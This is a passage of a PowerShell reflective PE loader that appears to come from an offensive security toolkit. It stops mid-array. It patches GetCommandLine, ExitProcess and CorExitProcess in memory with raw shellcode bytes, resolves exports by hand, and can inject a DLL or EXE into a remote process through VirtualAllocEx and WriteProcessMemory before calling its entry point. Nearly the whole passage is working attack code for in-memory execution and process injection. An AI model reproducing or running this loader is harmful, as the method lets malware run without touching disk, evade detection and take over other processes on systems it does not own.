                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )

        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }

        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize

            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )

        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @()

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0

        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8

        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length


        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null


        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################


        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)

                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################


        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process

        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr

        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr

        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)

            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }


    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }

        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }

        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }


        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }

            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }


        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        [IntPtr]$LoadAddr = [IntPtr]::Zero
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }

        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null


        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"


        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types


        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types


        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }


        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                #write-verbose "sleeping here"
                #start-sleep -seconds 20
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
